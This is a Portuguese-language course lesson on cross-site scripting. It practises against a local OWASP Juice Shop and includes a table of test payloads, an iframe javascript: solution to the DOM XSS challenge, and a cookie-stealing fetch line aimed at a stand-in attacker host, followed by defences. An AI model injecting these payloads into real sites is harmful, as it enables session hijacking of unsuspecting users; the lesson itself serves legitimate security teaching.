# Cross-Site Scripting (XSS)

*⏱️ Tempo de leitura: ~7 min*

> A injeção de SQL faz o banco obedecer. O XSS faz o navegador de **outra pessoa** obedecer — rodando um JavaScript seu na sessão dela.

## Pré-requisitos

- Ter lido a [Injeção de SQL](sql-injection.md)
- Juice Shop rodando (`http://localhost:3000`)

## O que é Cross-Site-Scripting (XSS)

Um site mostra na tela coisas que os usuários digitaram: um comentário, um nome, um termo de busca. **XSS** acontece quando o site exibe esse conteúdo sem tratar, e você consegue enfiar no meio um `<script>`.

Quando o navegador da vítima carrega a página, ele não sabe que aquele script é seu — ele executa como se fosse do próprio site. A partir daí você pode roubar o cookie de sessão, redirecionar pra um site falso ou reescrever a página na cara da pessoa.

## Os três tipos

| Tipo | Onde o script fica | Quem é atingido |
|------|--------------------|-----------------|
| **Refletido** | vai e volta na mesma requisição (na URL, num parâmetro de busca) | quem clica no seu link |
| **Armazenado** | fica salvo no servidor (um comentário, um perfil) | **todo mundo** que abrir a página |
| **DOM** | acontece só no navegador, via JavaScript da própria página | quem abrir a URL montada |

O **armazenado** é o mais perigoso: você injeta uma vez e ele dispara pra cada visitante, sem precisar enganar ninguém pra clicar em nada.

## O teste básico

Pra descobrir se um campo é vulnerável, a gente injeta um script inofensivo que só abre um popup:

```html
<script>alert('XSS')</script>
```

Se o popup aparecer, o site executou o seu código — está vulnerável. O `alert()` não faz mal nenhum; ele é só a prova de que dava pra rodar **qualquer** coisa ali.

Nem todo campo aceita um `<script>` direto. Dependendo de onde seu input cai, o payload muda:

| Onde cai | Payload |
|----------|---------|
| No meio do HTML | `<script>alert(1)</script>` |
| Dentro de um atributo | `"><img src=x onerror=alert(1)>` |
| Num link | `javascript:alert(1)` |

## Do popup ao roubo de sessão

O `alert()` é a prova de conceito. O que um atacante de verdade coloca no lugar é isto:

```html
<script>fetch('https://site-do-atacante/?c=' + document.cookie)</script>
```

Esse script lê o **cookie de sessão** da vítima e manda pro servidor do atacante. Lembra do **roubo de sessão** da Aula 2? Com o cookie na mão, o atacante entra como a vítima sem precisar da senha. O XSS é uma das formas mais comuns de roubar esse cookie.

## Desafio — Faça a busca executar seu código

O campo de busca do Juice Shop joga o que você digita direto na página, sem tratar. Faça um script seu rodar por ali.

??? tip "💡 Dica"
    Um `<script>` colado na página nem sempre roda. Um elemento que carrega um endereço `javascript:` (como um `<iframe>`) costuma passar.

??? success "✅ Solução"
    Na barra de busca, digite:

    ```html
    <iframe src="javascript:alert(`xss`)">
    ```

    A página insere o `<iframe>` no HTML e o navegador executa o `javascript:` dentro dele — o popup aparece. Isso resolve o desafio **DOM XSS**.

## Como se defende

- **Escapar a saída (output encoding).** Antes de jogar o input na página, transformar `<` em `&lt;`, `>` em `&gt;` etc. Aí o navegador mostra `<script>` como texto, em vez de executar.
- **Content Security Policy (CSP).** Um header que diz ao navegador de onde ele pode carregar e executar script — bloqueia código injetado que não veio do próprio site.
- **Cookie `HttpOnly`.** Marca o cookie de sessão como invisível pro JavaScript. Mesmo com um XSS, o `document.cookie` não enxerga ele — o roubo de sessão de cima para de funcionar.
- **Frameworks modernos** (React, Angular, Django) já escapam a saída por padrão, desde que você não force HTML na mão.

## Próximos passos

Você explorou o banco (SQLi) e o navegador (XSS). A última página da aula é sobre o que o atacante deixa pra trás depois de entrar: **[Malware e Ameaças](../aula7/malware.md)**.
